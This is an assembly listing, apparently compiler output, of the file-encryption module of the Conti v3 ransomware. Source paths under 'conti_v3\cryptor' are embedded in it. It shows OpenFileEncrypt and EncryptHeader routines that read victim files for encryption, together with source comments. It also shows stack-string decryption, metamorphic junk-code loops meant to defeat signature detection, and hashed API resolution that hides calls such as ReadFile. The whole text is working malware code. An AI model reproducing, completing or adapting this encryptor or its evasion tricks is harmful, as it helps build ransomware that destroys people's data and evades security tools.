  00de8	c6 45 42 3a	 mov	 BYTE PTR $T10[rbp-238], 58 ; 0000003aH
  00dec	c6 45 43 35	 mov	 BYTE PTR $T10[rbp-237], 53 ; 00000035H
  00df0	c6 45 44 3a	 mov	 BYTE PTR $T10[rbp-236], 58 ; 0000003aH
  00df4	c6 45 45 32	 mov	 BYTE PTR $T10[rbp-235], 50 ; 00000032H
  00df8	c6 45 46 3a	 mov	 BYTE PTR $T10[rbp-234], 58 ; 0000003aH
  00dfc	c6 45 47 75	 mov	 BYTE PTR $T10[rbp-233], 117 ; 00000075H
  00e00	c6 45 48 3a	 mov	 BYTE PTR $T10[rbp-232], 58 ; 0000003aH
  00e04	c6 45 49 39	 mov	 BYTE PTR $T10[rbp-231], 57 ; 00000039H
  00e08	c6 45 4a 3a	 mov	 BYTE PTR $T10[rbp-230], 58 ; 0000003aH
  00e0c	c6 45 4b 46	 mov	 BYTE PTR $T10[rbp-229], 70 ; 00000046H
  00e10	c6 45 4c 3a	 mov	 BYTE PTR $T10[rbp-228], 58 ; 0000003aH
  00e14	c6 45 4d 35	 mov	 BYTE PTR $T10[rbp-227], 53 ; 00000035H
  00e18	c6 45 4e 3a	 mov	 BYTE PTR $T10[rbp-226], 58 ; 0000003aH
  00e1c	c6 45 4f 2c	 mov	 BYTE PTR $T10[rbp-225], 44 ; 0000002cH
  00e20	c6 45 50 3a	 mov	 BYTE PTR $T10[rbp-224], 58 ; 0000003aH
  00e24	c6 45 51 75	 mov	 BYTE PTR $T10[rbp-223], 117 ; 00000075H
  00e28	c6 45 52 3a	 mov	 BYTE PTR $T10[rbp-222], 58 ; 0000003aH
  00e2c	c6 45 53 1f	 mov	 BYTE PTR $T10[rbp-221], 31
  00e30	c6 45 54 3a	 mov	 BYTE PTR $T10[rbp-220], 58 ; 0000003aH
  00e34	c6 45 55 46	 mov	 BYTE PTR $T10[rbp-219], 70 ; 00000046H
  00e38	c6 45 56 3a	 mov	 BYTE PTR $T10[rbp-218], 58 ; 0000003aH
  00e3c	c6 45 57 35	 mov	 BYTE PTR $T10[rbp-217], 53 ; 00000035H
  00e40	c6 45 58 3a	 mov	 BYTE PTR $T10[rbp-216], 58 ; 0000003aH
  00e44	c6 45 59 50	 mov	 BYTE PTR $T10[rbp-215], 80 ; 00000050H
  00e48	c6 45 5a 3a	 mov	 BYTE PTR $T10[rbp-214], 58 ; 0000003aH
  00e4c	c6 45 5b 2c	 mov	 BYTE PTR $T10[rbp-213], 44 ; 0000002cH
  00e50	c6 45 5c 3a	 mov	 BYTE PTR $T10[rbp-212], 58 ; 0000003aH
  00e54	c6 45 5d 1b	 mov	 BYTE PTR $T10[rbp-211], 27
  00e58	c6 45 5e 3a	 mov	 BYTE PTR $T10[rbp-210], 58 ; 0000003aH
  00e5c	c6 45 5f 35	 mov	 BYTE PTR $T10[rbp-209], 53 ; 00000035H
  00e60	c6 45 60 3a	 mov	 BYTE PTR $T10[rbp-208], 58 ; 0000003aH
  00e64	c6 45 61 23	 mov	 BYTE PTR $T10[rbp-207], 35 ; 00000023H
  00e68	c6 45 62 3a	 mov	 BYTE PTR $T10[rbp-206], 58 ; 0000003aH
  00e6c	c6 45 63 46	 mov	 BYTE PTR $T10[rbp-205], 70 ; 00000046H
  00e70	c6 45 64 3a	 mov	 BYTE PTR $T10[rbp-204], 58 ; 0000003aH
  00e74	c6 45 65 18	 mov	 BYTE PTR $T10[rbp-203], 24
  00e78	c6 45 66 3a	 mov	 BYTE PTR $T10[rbp-202], 58 ; 0000003aH
  00e7c	c6 45 67 3e	 mov	 BYTE PTR $T10[rbp-201], 62 ; 0000003eH
  00e80	c6 45 68 3a	 mov	 BYTE PTR $T10[rbp-200], 58 ; 0000003aH
  00e84	c6 45 69 17	 mov	 BYTE PTR $T10[rbp-199], 23
  00e88	c6 45 6a 3a	 mov	 BYTE PTR $T10[rbp-198], 58 ; 0000003aH
  00e8c	c6 45 6b 2c	 mov	 BYTE PTR $T10[rbp-197], 44 ; 0000002cH
  00e90	c6 45 6c 3a	 mov	 BYTE PTR $T10[rbp-196], 58 ; 0000003aH
  00e94	c6 45 6d 18	 mov	 BYTE PTR $T10[rbp-195], 24
  00e98	c6 45 6e 3a	 mov	 BYTE PTR $T10[rbp-194], 58 ; 0000003aH
  00e9c	c6 45 6f 4b	 mov	 BYTE PTR $T10[rbp-193], 75 ; 0000004bH
  00ea0	c6 45 70 3a	 mov	 BYTE PTR $T10[rbp-192], 58 ; 0000003aH
  00ea4	c6 45 71 40	 mov	 BYTE PTR $T10[rbp-191], 64 ; 00000040H
  00ea8	c6 45 72 3a	 mov	 BYTE PTR $T10[rbp-190], 58 ; 0000003aH
  00eac	c6 45 73 40	 mov	 BYTE PTR $T10[rbp-189], 64 ; 00000040H
  00eb0	c6 45 74 3a	 mov	 BYTE PTR $T10[rbp-188], 58 ; 0000003aH
  00eb4	c6 45 75 7c	 mov	 BYTE PTR $T10[rbp-187], 124 ; 0000007cH
  00eb8	c6 45 76 3a	 mov	 BYTE PTR $T10[rbp-186], 58 ; 0000003aH
  00ebc	c6 45 77 40	 mov	 BYTE PTR $T10[rbp-185], 64 ; 00000040H
  00ec0	c6 45 78 3a	 mov	 BYTE PTR $T10[rbp-184], 58 ; 0000003aH
  00ec4	c6 45 79 35	 mov	 BYTE PTR $T10[rbp-183], 53 ; 00000035H
  00ec8	c6 45 7a 3a	 mov	 BYTE PTR $T10[rbp-182], 58 ; 0000003aH
  00ecc	c6 45 7b 6c	 mov	 BYTE PTR $T10[rbp-181], 108 ; 0000006cH
  00ed0	c6 45 7c 3a	 mov	 BYTE PTR $T10[rbp-180], 58 ; 0000003aH
  00ed4	c6 45 7d 35	 mov	 BYTE PTR $T10[rbp-179], 53 ; 00000035H
  00ed8	c6 45 7e 3a	 mov	 BYTE PTR $T10[rbp-178], 58 ; 0000003aH
  00edc	c6 45 7f 50	 mov	 BYTE PTR $T10[rbp-177], 80 ; 00000050H
  00ee0	c6 85 80 00 00
	00 3a		 mov	 BYTE PTR $T10[rbp-176], 58 ; 0000003aH
  00ee7	c6 85 81 00 00
	00 39		 mov	 BYTE PTR $T10[rbp-175], 57 ; 00000039H
  00eee	c6 85 82 00 00
	00 3a		 mov	 BYTE PTR $T10[rbp-174], 58 ; 0000003aH
  00ef5	c6 85 83 00 00
	00 04		 mov	 BYTE PTR $T10[rbp-173], 4
  00efc	c6 85 84 00 00
	00 3a		 mov	 BYTE PTR $T10[rbp-172], 58 ; 0000003aH
  00f03	c6 85 85 00 00
	00 3a		 mov	 BYTE PTR $T10[rbp-171], 58 ; 0000003aH
  00f0a	c6 85 86 00 00
	00 3a		 mov	 BYTE PTR $T10[rbp-170], 58 ; 0000003aH
  00f11	0f b6 45 31	 movzx	 eax, BYTE PTR $T10[rbp-255]

; 58   :         return m_isDecrypted;

  00f15	0f b6 45 30	 movzx	 eax, BYTE PTR $T10[rbp-256]

; 63   :         if (!isDecrypted())

  00f19	84 c0		 test	 al, al
  00f1b	75 57		 jne	 SHORT $LN200@OpenFileEn
  00f1d	0f 1f 00	 npad	 3
$LL201@OpenFileEn:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00f20	0f b6 4c 3d 31	 movzx	 ecx, BYTE PTR $T10[rbp+rdi-255]

; 40   :     return (a % n + n) % n;

  00f25	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00f2a	83 e9 3a	 sub	 ecx, 58			; 0000003aH
  00f2d	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00f31	41 f7 e8	 imul	 r8d
  00f34	41 03 d0	 add	 edx, r8d
  00f37	c1 fa 06	 sar	 edx, 6
  00f3a	8b c2		 mov	 eax, edx
  00f3c	c1 e8 1f	 shr	 eax, 31
  00f3f	03 d0		 add	 edx, eax
  00f41	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00f44	44 2b c0	 sub	 r8d, eax
  00f47	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00f4c	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00f50	41 f7 e8	 imul	 r8d
  00f53	41 03 d0	 add	 edx, r8d
  00f56	c1 fa 06	 sar	 edx, 6
  00f59	8b c2		 mov	 eax, edx
  00f5b	c1 e8 1f	 shr	 eax, 31
  00f5e	03 d0		 add	 edx, eax
  00f60	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00f63	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00f66	44 88 44 3d 31	 mov	 BYTE PTR $T10[rbp+rdi-255], r8b
  00f6b	48 ff c7	 inc	 rdi
  00f6e	48 83 ff 56	 cmp	 rdi, 86			; 00000056H
  00f72	72 ac		 jb	 SHORT $LL201@OpenFileEn
$LN200@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 893  : 		logs::Write(OBFW(L"Can't get file size %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());

  00f74	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  00f77	48 8d 4d 31	 lea	 rcx, QWORD PTR $T10[rbp-255]
  00f7b	45 8b c1	 mov	 r8d, r9d
  00f7e	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 894  : 		CloseHandle(FileInfo->FileHandle);

  00f83	48 8b 4e 08	 mov	 rcx, QWORD PTR [rsi+8]
  00f87	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_CloseHandle
$LN1358@OpenFileEn:

; 901  : }

  00f8d	33 c0		 xor	 eax, eax
$LN1@OpenFileEn:
  00f8f	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00f96	48 33 cc	 xor	 rcx, rsp
  00f99	e8 00 00 00 00	 call	 __security_check_cookie
  00f9e	4c 8d 9c 24 70
	02 00 00	 lea	 r11, QWORD PTR [rsp+624]
  00fa6	49 8b 5b 18	 mov	 rbx, QWORD PTR [r11+24]
  00faa	49 8b 73 20	 mov	 rsi, QWORD PTR [r11+32]
  00fae	49 8b 7b 28	 mov	 rdi, QWORD PTR [r11+40]
  00fb2	49 8b e3	 mov	 rsp, r11
  00fb5	5d		 pop	 rbp
  00fb6	c3		 ret	 0
?OpenFileEncrypt@@YAKPEAUfile_info@cryptor@@@Z ENDP	; OpenFileEncrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?EncryptHeader@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z
_TEXT	SEGMENT
_morph_var$1 = 48
_morph_var$2 = 48
_morph_var$3 = 48
_morph_var$4 = 48
_morph_var$5 = 48
_morph_var$6 = 48
_morph_var$7 = 48
_morph_var$8 = 48
BytesRead$ = 52
__$ArrayPad$ = 56
FileInfo$ = 128
Buffer$ = 136
CryptoProvider$dead$ = 144
PublicKey$dead$ = 152
?EncryptHeader@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z PROC ; EncryptHeader, COMDAT

; 911  : {

$LN439:
  00000	40 55		 push	 rbp
  00002	53		 push	 rbx
  00003	57		 push	 rdi
  00004	41 54		 push	 r12
  00006	41 55		 push	 r13
  00008	41 56		 push	 r14
  0000a	41 57		 push	 r15
  0000c	48 8b ec	 mov	 rbp, rsp
  0000f	48 83 ec 40	 sub	 rsp, 64			; 00000040H
  00013	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001a	48 33 c4	 xor	 rax, rsp
  0001d	48 89 45 f8	 mov	 QWORD PTR __$ArrayPad$[rbp-64], rax
  00021	4c 8b fa	 mov	 r15, rdx

; 912  : 	BOOL Success = FALSE;
; 913  : 	DWORD BytesRead = 0;

  00024	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR BytesRead$[rbp-64], 0
  0002b	4c 8b e9	 mov	 r13, rcx

; 914  : 	DWORD BytesToRead = 0;
; 915  : 	DWORD BytesToWrite = 0;
; 916  : 	LONGLONG TotalRead = 0;

  0002e	48 89 b4 24 90
	00 00 00	 mov	 QWORD PTR [rsp+144], rsi
  00036	45 33 f6	 xor	 r14d, r14d
  00039	41 bc 00 00 50
	00		 mov	 r12d, 5242880		; 00500000H
  0003f	90		 npad	 1
$LL2@EncryptHea:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00040	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$7[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00047	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0004c	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$7[rbp-64]
  0004f	f7 e9		 imul	 ecx
  00051	8b c2		 mov	 eax, edx
  00053	c1 e8 1f	 shr	 eax, 31
  00056	03 d0		 add	 edx, eax
  00058	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0005b	3b c8		 cmp	 ecx, eax
  0005d	74 40		 je	 SHORT $LN18@EncryptHea

; 49   : 		_morph_var += (int)a + 2;

  0005f	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$7[rbp-64]
  00062	83 c1 02	 add	 ecx, 2
  00065	41 03 ce	 add	 ecx, r14d
  00068	89 4d f0	 mov	 DWORD PTR _morph_var$7[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0006b	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$7[rbp-64]
  0006e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00073	7d 07		 jge	 SHORT $LN324@EncryptHea
  00075	ff c8		 dec	 eax
  00077	83 c8 fc	 or	 eax, -4
  0007a	ff c0		 inc	 eax
$LN324@EncryptHea:
  0007c	85 c0		 test	 eax, eax
  0007e	75 70		 jne	 SHORT $LN17@EncryptHea
$LL10@EncryptHea:
  00080	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$7[rbp-64]
  00083	ff c0		 inc	 eax
  00085	89 45 f0	 mov	 DWORD PTR _morph_var$7[rbp-64], eax
  00088	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$7[rbp-64]
  0008b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00090	7d 07		 jge	 SHORT $LN323@EncryptHea
  00092	ff c8		 dec	 eax
  00094	83 c8 fc	 or	 eax, -4
  00097	ff c0		 inc	 eax
$LN323@EncryptHea:
  00099	85 c0		 test	 eax, eax
  0009b	74 e3		 je	 SHORT $LL10@EncryptHea

; 51   : 	}

  0009d	eb 51		 jmp	 SHORT $LN17@EncryptHea
$LN18@EncryptHea:

; 52   : 	else if (_morph_var % 2) {

  0009f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$7[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  000a2	b9 02 00 00 00	 mov	 ecx, 2
  000a7	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$7[rbp-64]
  000aa	41 2b ce	 sub	 ecx, r14d
  000ad	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  000af	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000b4	89 4d f0	 mov	 DWORD PTR _morph_var$7[rbp-64], ecx
  000b7	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$7[rbp-64]
  000ba	f7 e9		 imul	 ecx
  000bc	8b c2		 mov	 eax, edx
  000be	c1 e8 1f	 shr	 eax, 31
  000c1	03 d0		 add	 edx, eax
  000c3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000c6	3b c8		 cmp	 ecx, eax
  000c8	75 26		 jne	 SHORT $LN17@EncryptHea
  000ca	66 0f 1f 44 00
	00		 npad	 6
$LL12@EncryptHea:
  000d0	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$7[rbp-64]
  000d3	ff c0		 inc	 eax
  000d5	89 45 f0	 mov	 DWORD PTR _morph_var$7[rbp-64], eax
  000d8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000dd	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$7[rbp-64]
  000e0	f7 e9		 imul	 ecx
  000e2	8b c2		 mov	 eax, edx
  000e4	c1 e8 1f	 shr	 eax, 31
  000e7	03 d0		 add	 edx, eax
  000e9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000ec	3b c8		 cmp	 ecx, eax
  000ee	74 e0		 je	 SHORT $LL12@EncryptHea
$LN17@EncryptHea:

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  000f0	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$6[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  000f7	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000fc	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$6[rbp-64]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 926  : 		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;

  000ff	bf 00 00 10 00	 mov	 edi, 1048576		; 00100000H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00104	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 926  : 		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;

  00106	49 2b fe	 sub	 rdi, r14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00109	8b c2		 mov	 eax, edx
  0010b	c1 e8 1f	 shr	 eax, 31
  0010e	03 d0		 add	 edx, eax
  00110	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00113	3b c8		 cmp	 ecx, eax
  00115	74 48		 je	 SHORT $LN39@EncryptHea

; 49   : 		_morph_var += (int)a + 2;

  00117	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$6[rbp-64]
  0011a	83 c1 02	 add	 ecx, 2
  0011d	03 cf		 add	 ecx, edi
  0011f	89 4d f0	 mov	 DWORD PTR _morph_var$6[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00122	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$6[rbp-64]
  00125	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0012a	7d 07		 jge	 SHORT $LN321@EncryptHea
  0012c	ff c8		 dec	 eax
  0012e	83 c8 fc	 or	 eax, -4
  00131	ff c0		 inc	 eax
$LN321@EncryptHea:
  00133	85 c0		 test	 eax, eax
  00135	75 79		 jne	 SHORT $LN38@EncryptHea
  00137	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL31@EncryptHea:
  00140	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$6[rbp-64]
  00143	ff c0		 inc	 eax
  00145	89 45 f0	 mov	 DWORD PTR _morph_var$6[rbp-64], eax
  00148	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$6[rbp-64]
  0014b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00150	7d 07		 jge	 SHORT $LN320@EncryptHea
  00152	ff c8		 dec	 eax
  00154	83 c8 fc	 or	 eax, -4
  00157	ff c0		 inc	 eax
$LN320@EncryptHea:
  00159	85 c0		 test	 eax, eax
  0015b	74 e3		 je	 SHORT $LL31@EncryptHea

; 51   : 	}

  0015d	eb 51		 jmp	 SHORT $LN38@EncryptHea
$LN39@EncryptHea:

; 52   : 	else if (_morph_var % 2) {

  0015f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$6[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  00162	b9 02 00 00 00	 mov	 ecx, 2
  00167	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$6[rbp-64]
  0016a	2b cf		 sub	 ecx, edi
  0016c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0016e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00173	89 4d f0	 mov	 DWORD PTR _morph_var$6[rbp-64], ecx
  00176	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$6[rbp-64]
  00179	f7 e9		 imul	 ecx
  0017b	8b c2		 mov	 eax, edx
  0017d	c1 e8 1f	 shr	 eax, 31
  00180	03 d0		 add	 edx, eax
  00182	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00185	3b c8		 cmp	 ecx, eax
  00187	75 27		 jne	 SHORT $LN38@EncryptHea
  00189	0f 1f 80 00 00
	00 00		 npad	 7
$LL33@EncryptHea:
  00190	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$6[rbp-64]
  00193	ff c0		 inc	 eax
  00195	89 45 f0	 mov	 DWORD PTR _morph_var$6[rbp-64], eax
  00198	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0019d	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$6[rbp-64]
  001a0	f7 e9		 imul	 ecx
  001a2	8b c2		 mov	 eax, edx
  001a4	c1 e8 1f	 shr	 eax, 31
  001a7	03 d0		 add	 edx, eax
  001a9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001ac	3b c8		 cmp	 ecx, eax
  001ae	74 e0		 je	 SHORT $LL33@EncryptHea
$LN38@EncryptHea:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 930  : 		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

  001b0	49 3b fc	 cmp	 rdi, r12
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  001b3	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$5[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  001ba	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$5[rbp-64]
  001bd	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 930  : 		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

  001c2	41 0f 4f fc	 cmovg	 edi, r12d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  001c6	f7 e9		 imul	 ecx
  001c8	8b c2		 mov	 eax, edx
  001ca	c1 e8 1f	 shr	 eax, 31
  001cd	03 d0		 add	 edx, eax
  001cf	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001d2	3b c8		 cmp	 ecx, eax
  001d4	74 49		 je	 SHORT $LN60@EncryptHea

; 49   : 		_morph_var += (int)a + 2;

  001d6	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$5[rbp-64]
  001d9	83 c1 02	 add	 ecx, 2
  001dc	03 cf		 add	 ecx, edi
  001de	89 4d f0	 mov	 DWORD PTR _morph_var$5[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  001e1	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$5[rbp-64]
  001e4	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  001e9	7d 07		 jge	 SHORT $LN318@EncryptHea
  001eb	ff c8		 dec	 eax
  001ed	83 c8 fc	 or	 eax, -4
  001f0	ff c0		 inc	 eax
$LN318@EncryptHea:
  001f2	85 c0		 test	 eax, eax
  001f4	75 7a		 jne	 SHORT $LN59@EncryptHea
  001f6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL52@EncryptHea:
  00200	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$5[rbp-64]
  00203	ff c0		 inc	 eax
  00205	89 45 f0	 mov	 DWORD PTR _morph_var$5[rbp-64], eax
  00208	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$5[rbp-64]
  0020b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00210	7d 07		 jge	 SHORT $LN317@EncryptHea
  00212	ff c8		 dec	 eax
  00214	83 c8 fc	 or	 eax, -4
  00217	ff c0		 inc	 eax
$LN317@EncryptHea:
  00219	85 c0		 test	 eax, eax
  0021b	74 e3		 je	 SHORT $LL52@EncryptHea

; 51   : 	}

  0021d	eb 51		 jmp	 SHORT $LN59@EncryptHea
$LN60@EncryptHea:

; 52   : 	else if (_morph_var % 2) {

  0021f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$5[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  00222	b9 02 00 00 00	 mov	 ecx, 2
  00227	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$5[rbp-64]
  0022a	2b cf		 sub	 ecx, edi
  0022c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0022e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00233	89 4d f0	 mov	 DWORD PTR _morph_var$5[rbp-64], ecx
  00236	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$5[rbp-64]
  00239	f7 e9		 imul	 ecx
  0023b	8b c2		 mov	 eax, edx
  0023d	c1 e8 1f	 shr	 eax, 31
  00240	03 d0		 add	 edx, eax
  00242	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00245	3b c8		 cmp	 ecx, eax
  00247	75 27		 jne	 SHORT $LN59@EncryptHea
  00249	0f 1f 80 00 00
	00 00		 npad	 7
$LL54@EncryptHea:
  00250	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$5[rbp-64]
  00253	ff c0		 inc	 eax
  00255	89 45 f0	 mov	 DWORD PTR _morph_var$5[rbp-64], eax
  00258	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0025d	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$5[rbp-64]
  00260	f7 e9		 imul	 ecx
  00262	8b c2		 mov	 eax, edx
  00264	c1 e8 1f	 shr	 eax, 31
  00267	03 d0		 add	 edx, eax
  00269	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0026c	3b c8		 cmp	 ecx, eax
  0026e	74 e0		 je	 SHORT $LL54@EncryptHea
$LN59@EncryptHea:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 934  : 		Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);

  00270	49 8b 5d 08	 mov	 rbx, QWORD PTR [r13+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 92   : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x55f5048a, 105);//GetProcAddress(hKernel32, OBFA("ReadFile"));

  00274	ba 0f 00 00 00	 mov	 edx, 15
  00279	41 b8 8a 04 f5
	55		 mov	 r8d, 1442120842		; 55f5048aH
  0027f	44 8d 4a 5a	 lea	 r9d, QWORD PTR [rdx+90]
